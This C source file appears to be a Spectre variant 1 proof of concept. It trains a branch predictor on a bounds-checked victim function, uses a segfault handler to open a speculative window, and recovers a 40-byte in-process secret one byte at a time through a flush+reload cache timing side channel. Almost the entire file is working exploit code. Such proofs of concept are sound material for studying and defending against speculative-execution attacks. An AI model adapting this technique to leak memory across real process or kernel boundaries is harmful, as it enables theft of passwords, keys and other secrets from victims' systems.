#include <stdio.h>
#include <stdint.h>
#include <malloc.h>
#include <unistd.h>
#include <stdlib.h>
#include <ctype.h>
#include <limits.h>
#include <unistd.h> 
#include <signal.h>
#include <errno.h>
#include <sys/mman.h>
#include <setjmp.h>

#include "../fnr_helper.h"

#define CACHE_HIT_THRESHOLD 120
#define TRY_LIMIT 1000
int try = 0;

uint8_t array[256 * 4096];
uint8_t temp = 0;
uint8_t unused1[64];
unsigned int bufferSize = 16;
uint8_t unused2[64];
int bufferSizeMask = 0x0f;
uint8_t unused3[64];

uint8_t buffer[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
char secret[] = "The Magic Words are Squeamish Ossifrage.";

int find_cached_index(int* scores);
void find_highest_score(int* scores);
void train_victim();
void steal_byte(int* scores, size_t larger_x);


void leakByteLocalFunction(uint8_t k) { temp &= array[(k)* 4096]; }

void victim_function(size_t x) {
	if(x < bufferSize) {
		leakByteLocalFunction(buffer[x]);
	}
}


// SIGNAL HANDLERS
static jmp_buf trycatch_buf;


void unblock_signal(int signum __attribute__((__unused__))) {
  sigset_t sigs;
  sigemptyset(&sigs);
  sigaddset(&sigs, signum);
  sigprocmask(SIG_UNBLOCK, &sigs, NULL);
}

void trycatch_segfault_handler(int signum) {
  (void)signum;
  unblock_signal(SIGSEGV);
  unblock_signal(SIGFPE);
  longjmp(trycatch_buf, 1);
}

int find_cached_index(int* scores){

	uint64_t time_dif;
    int mix_i;
    int successFlag = 0;
	for(int i = 0; i < 256; i++){
		time_dif = 0;
        mix_i = ((i * 167) + 13) & 255;
		measure_time(time_dif, &array[mix_i * 4096]);

		if(time_dif < CACHE_HIT_THRESHOLD && mix_i != 0){
            successFlag = 1;
			scores[mix_i]++;
		}
	}
    return successFlag;
}

void find_highest_score(int* scores){
	int maxScore = 0;
	int maxIndex = 0;

	for (int i = 1; i < 256; i++){
		if(scores[i] > maxScore){
			maxIndex = i;
			maxScore = scores[i];
		}
	}
	printf("Letter: %c\t Index: %d\t Hits:%d \t Tries:%d\n", maxIndex, maxIndex, maxScore, try);
}

void train_victim(){
	clflush_array(array);

    for (int i = 0; i < 30; i++){
		clflush(&bufferSize);
      	clflush_array(array);
		victim_function(i % 10);
	}
	clflush(&bufferSize);
	clflush_array(array);
       	
}
void steal_byte(int* scores, size_t larger_x){
	signal(SIGSEGV, trycatch_segfault_handler);

    for(int it = 10; it > 0; it--){
	
    	train_victim();
		
		if (!setjmp(trycatch_buf)) {
			*(volatile char*)0;
			victim_function(larger_x);
		}

        int success = find_cached_index(scores);
		if(!success){
            it--; // repeat this step again!
            try++;
        }
		if(try == TRY_LIMIT){
            // skip
            break;
        }
    }
    find_highest_score(scores);
    try = 0;
}

int main(){
	// initialize the array
	for (int i = 0; i < 256 * 4096; i++){
		array[i] = i % 256;
	}
	// steal the secret, secret is 40 byte long
	
	for(int i =0; i < 40; i++){
		clflush_array(array);

		// initialize scores
		int* scores =(int*) malloc(256 * sizeof(int));
		for (int i = 0; i < 256; i++)
		{
			scores[i] = 0;
		}
		// out of bounds access
		size_t larger_x = (size_t)(secret - (char*)buffer + i);
		
		steal_byte(scores, larger_x);

		free(scores);
	}
	
	return 0;
}
